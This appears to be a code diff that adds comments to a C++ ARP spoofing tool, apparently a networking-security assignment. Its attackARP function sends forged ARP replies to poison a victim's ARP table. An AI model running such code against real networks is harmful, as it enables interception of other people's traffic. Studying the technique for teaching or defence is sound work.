@@ -39,7 +39,7 @@ bool getMyInfo(const std::string& interface, Mac& MAC, Ip& IP) {
 #ifdef DEBUG
     std::cout << "[DEBUG] Successfully open socket\n";
 #endif
-
+    // Set protocol to IPv4
     ifr.ifr_addr.sa_family = AF_INET;
 
     // Put interface name to ifreq
@@ -54,8 +54,10 @@ bool getMyInfo(const std::string& interface, Mac& MAC, Ip& IP) {
 #ifdef DEBUG
     std::cout << "[DEBUG] Successfully process ioctl\n";
 #endif
+    // Only one use and deep copy, so don't have to use inet_ntop 
     IP = Ip(inet_ntoa(((sockaddr_in *)&ifr.ifr_addr)->sin_addr));
 
+    // Socket close
     if(close(sockfd)) {
         std::cerr << CLOSE_ERROR_MSG;
         return false;
@@ -71,6 +73,7 @@ bool getMyInfo(const std::string& interface, Mac& MAC, Ip& IP) {
 
 /*
  * get MAC address by IP using ARP request
+ * Use sendPacketARP function to send packet
 */
 bool getMACByIP(pcap_t* pcap, Mac& MAC, const Ip& IP, const Mac& myMAC, const Ip& myIP) {
     struct pcap_pkthdr* header;
@@ -82,7 +85,8 @@ bool getMACByIP(pcap_t* pcap, Mac& MAC, const Ip& IP, const Mac& myMAC, const Ip
 #ifdef DEBUG
     std::cout << "[DEBUG] Successfully get into function 'getMACByIP'\n";
 #endif
-    
+
+    // send ARP packet
     if(not sendPacketARP(pcap, Mac::broadcastMac(), myMAC, myMAC, myIP, Mac::nullMac(), IP, ArpHdr::Request)) {
         return false;
     }
@@ -91,6 +95,7 @@ bool getMACByIP(pcap_t* pcap, Mac& MAC, const Ip& IP, const Mac& myMAC, const Ip
     std::cout << "[DEBUG] Successfully send request packet\n";
 #endif
 
+    // receive ARP reply from gateway
     while( true ) {
         res = pcap_next_ex(pcap, &header, &packet);
 
@@ -118,6 +123,7 @@ bool getMACByIP(pcap_t* pcap, Mac& MAC, const Ip& IP, const Mac& myMAC, const Ip
     std::cout << "[DEBUG] Successfully receive reply packet\n";
 #endif
 
+    // Deep copy from ARPHeader to MAC
     MAC = ARPHeader->smac();
 
     return true;
@@ -125,6 +131,7 @@ bool getMACByIP(pcap_t* pcap, Mac& MAC, const Ip& IP, const Mac& myMAC, const Ip
 
 /*
  * Send ARP packet using pcap
+ * Use pcap_sendpacket to send packet ARP packet
 */
 bool sendPacketARP(pcap_t* pcap, 
                    const Mac& destMAC, const Mac& sourceMAC,
@@ -172,6 +179,9 @@ bool sendPacketARP(pcap_t* pcap,
     return true;
 }
 
+/*
+ * Attack sender's machine by changing ARP table using fake ARP reply
+*/
 bool attackARP(pcap_t* pcap, 
                const Mac& sendMAC, const Ip& sendIP, 
                const Mac& myMAC, const Ip& targetIP) {
@@ -179,7 +189,7 @@ bool attackARP(pcap_t* pcap,
 #ifdef DEBUG
     std::cout << "[DEBUG] Successfully get into function 'attackARP'\n";
 #endif
-
+    // send ARP packet for changing ARP table of sender's machine
     for(int i = 0; i < 10; i++) {
         if(not sendPacketARP(pcap, sendMAC, myMAC, myMAC, targetIP, sendMAC, sendIP, ArpHdr::Reply)) {
             return false;
@@ -193,6 +203,9 @@ bool attackARP(pcap_t* pcap,
     return true;
 }
 
+/*
+ * print information of Attacker, sender, and target
+*/
 void printInfo(const Mac& myMAC, const Ip& myIP, 
                const Mac& sendMAC, const Ip& sendIP, 
                const Ip& targetIP) {
